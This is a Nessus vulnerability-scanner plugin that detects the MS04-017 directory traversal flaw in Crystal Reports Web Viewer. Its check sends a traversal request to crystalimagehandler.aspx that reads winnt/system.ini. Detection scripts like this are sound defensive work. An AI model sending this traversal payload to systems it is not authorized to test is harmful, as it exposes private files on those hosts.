#
# (C) Tenable Network Security, Inc.
#

if ( NASL_LEVEL < 3000 ) exit(0);


include("compat.inc");

if (description)
{
 script_id(12271);
 script_version ("$Revision: 1.16 $");

 script_cve_id("CVE-2004-0204");
 script_bugtraq_id(10260);
 script_xref(name:"OSVDB", value:"6748");

 script_name(english:"MS04-017: Crystal Reports Web Viewer Could Allow Information Disclosure and DoS (842689) (uncredentialed check)");
 script_summary(english:"Crystal Report virtual directory traversal");

 script_set_attribute(
  attribute:"synopsis",
  value:string(
   "The web application running on the remote host has a directory\n",
   "traversal vulnerability."
  )
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The remote host is running a version of Crystal Report Web interface\n",
   "that is vulnerable to a remote directory traversal attack.  An\n",
   "attacker exploiting this issue would be able to read or delete\n",
   "arbitrary files outside of the web root."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://www.microsoft.com/technet/security/bulletin/MS04-017.mspx"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Upgrade the software or utilize ACLs on the virtual directory."
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

dirs = make_list(
  cgi_dirs(),
  "/CrystalReportWebFormViewer",
  "/CrystalReportWebFormViewer2",
  "/crystalreportViewers"
);

foreach dir (dirs)
{
  url = dir + "/crystalimagehandler.aspx?dynamicimage=../../../../../../../../winnt/system.ini";
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server did not respond.");
	
  if ( "[drivers]" >< res[2] )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus accessed system.ini by requesting the following URL :\n\n",
        "  ", build_url(port: port, qs: url), "\n"
      );

      if (report_verbosity > 1)
        report += string("\nWhich revealed the contents :\n\n", res[2], "\n");

      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}


